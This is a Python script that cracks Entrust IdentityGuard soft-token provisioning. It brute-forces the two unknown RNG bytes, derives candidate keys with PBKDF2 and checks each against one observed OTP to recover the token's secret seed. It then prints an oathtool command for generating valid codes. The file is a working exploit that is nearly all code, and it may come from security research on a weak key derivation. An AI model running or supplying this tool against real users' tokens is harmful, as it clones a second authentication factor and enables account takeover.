#!/bin/env python3
from hashlib import pbkdf2_hmac
import argparse
import logging
import hashlib
from oath import totp

logging.basicConfig(level=logging.WARNING)

parser = argparse.ArgumentParser(
    description='Generate an OTP secret for an Entrust IdentityGuard soft token',
    epilog='If your cracking does not work, try without the Policy argument, as in some cases, this is not used to generate the OTP secret. You can also try adding or removing 30 seconds from the OTPTime parameter, in case a users device has slightly wrong time.'
)
parser.add_argument('Serial', type=str, nargs=1, help='Given to the user (such as through a QR code). Example: 48244-13456')
parser.add_argument('ActivationCode', type=str, nargs=1, help='Given to the user (such as through a QR code). Example: 1745-7712-6942-8698')
parser.add_argument('OTP', type=str, nargs=1, help='An OTP token generated from a given identity. You *must* know the time this was generated for it to be useful. Example: 615136')
parser.add_argument('OTPTime', type=int, nargs=1, help='The time in seconds since EPOCH when the OTP was generated. There is some slack in this value (approximately 30 seconds). Example (2019-10-07 07:50:09 UTC): 1570434609')
parser.add_argument('--policy', type=str, nargs=1, required=False, help='The policy associated with the identity. Example: {"allowUnsecured":"false","trustedExecution":"NOT_ALLOWED"}')
parser.add_argument('--strict-time', type=bool, nargs='?', const=True, required=False, help='Only search for valid keys strictly for the given timestamp. Without this option, the tool will attempt to search 30 seconds ahead or behind the given OTPTime to increase the chances of finding the key')
args = parser.parse_args()

# Remove dashes from input so we can work with the data
serial = args.Serial[0].replace("-", "")
activation = args.ActivationCode[0].replace("-", "")

# TODO: Validate all values through the Luhn check digits

activation = activation[0:-1] # remove last digit -- check digit
activationbytes = int(activation).to_bytes(7, byteorder='big')
logging.info("Activation bytes: 0x%s", activationbytes.hex())

keys = []

timeToSearch = []
timeToSearch.append(args.OTPTime[0])

if not args.strict_time:
    # Lets add some slack
    timeToSearch.append(args.OTPTime[0] - 30)
    timeToSearch.append(args.OTPTime[0] + 30)

logging.debug("Time to search array: %s", str(timeToSearch))

# Lets iterate over our (sloppy) possible times
for otpTime in timeToSearch:
    # We now begin our bruteforce process to determine what RNG bytes were used
    # This is only 2 bytes, so can be done fairly simply (65535 possible values)
    for i in range(65535):
        # Convert i into our two bytes (endianness doesn't matter, as long as we hit all combinations)
        rngbytes = i.to_bytes(2, byteorder='big')

        password = activationbytes + rngbytes

        # The secret may or may not include the policy
        if args.policy is not None:
            password += args.policy[0].encode('utf-8')
            logging.info("Policy: %s", args.policy[0].encode('utf-8'))
        else:
            logging.debug("Policy not provided")

        # Derive the secret key
        key = pbkdf2_hmac(
            hash_name='sha256',
            password=password,
            salt=serial.encode("utf-8"),
            iterations=8,
            dklen=16
        )

        # Verify whether the output is valid for the given time
        otp = totp(key.hex(), hash=hashlib.sha256, t=otpTime)

        if otp == args.OTP[0]:
            print("Possibe valid OTP seed found: ", key.hex())
            keys.append(key)

if len(keys) == 0:
    print("No valid keys were found")
elif len(keys) == 1:
    print("To generate a code immediately, run:")
    print("oathtool -v --totp=sha256 --digits=6 " + keys[0].hex())
else:
    print("To generate a code immediately, run:")
    print("oathtool -v --totp=sha256 --digits=6 (found key)")
